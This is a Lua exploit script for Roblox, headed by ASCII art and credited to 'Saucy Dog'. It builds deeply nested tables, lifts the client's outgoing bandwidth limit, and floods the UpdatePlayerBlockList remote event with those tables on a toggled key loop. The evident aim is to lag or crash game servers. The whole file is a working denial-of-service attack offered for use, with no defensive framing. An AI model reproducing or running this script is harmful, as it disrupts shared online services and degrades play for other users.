--[[

  ______                                           _______                      
 /      \                                         |       \                     
|  $$$$$$\  ______   __    __   _______  __    __ | $$$$$$$\  ______    ______  
| $$___\$$ |      \ |  \  |  \ /       \|  \  |  \| $$  | $$ /      \  /      \ 
 \$$    \   \$$$$$$\| $$  | $$|  $$$$$$$| $$  | $$| $$  | $$|  $$$$$$\|  $$$$$$\
 _\$$$$$$\ /      $$| $$  | $$| $$      | $$  | $$| $$  | $$| $$  | $$| $$  | $$
|  \__| $$|  $$$$$$$| $$__/ $$| $$_____ | $$__/ $$| $$__/ $$| $$__/ $$| $$__| $$
 \$$    $$ \$$    $$ \$$    $$ \$$     \ \$$    $$| $$    $$ \$$    $$ \$$    $$
  \$$$$$$   \$$$$$$$  \$$$$$$   \$$$$$$$ _\$$$$$$$ \$$$$$$$   \$$$$$$  _\$$$$$$$
                                        |  \__| $$                    |  \__| $$
                                         \$$    $$                     \$$    $$
                                          \$$$$$$                       \$$$$$$ 
   Updated by Saucy Dog since of 7/24/2022, If any errors msg Saucy Dog#9999
]]
--//settings and variables
getgenv().Toggled=false
getgenv().KeyBind="z"
getgenv().Delay=0.7
local UIS=game:GetService'UserInputService'

--//main shit

local function Source()
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val) 
   local mainvalueifonetable = 49999
   if type(val) ~= "number" then
       return nil 
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval 
end

local function bomb(tableincrease, tries) 
 local maintable = {}
 local spammedtable = {}
 
 table.insert(spammedtable, {})
 z = spammedtable[1]
 
 for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
 end 
 
 local calculatemax = getmaxvalue(tableincrease) 
 local maximum 
 
 if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 
 
  if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 

 for i = 1, tries do
    game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
 end
end


bomb(250, 5) --// change values if client crashes
end
UIS.InputBegan:Connect(function(Key)
    if Key.KeyCode==Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
        if getgenv().Toggled then
            getgenv().Toggled=false
            warn'Disabled!'
        elseif not getgenv().Toggled then
            getgenv().Toggled=true
            warn'Enabled!'
            while getgenv().Toggled do
                Source()
                wait(getgenv().Delay)
            end
        end
    end
end)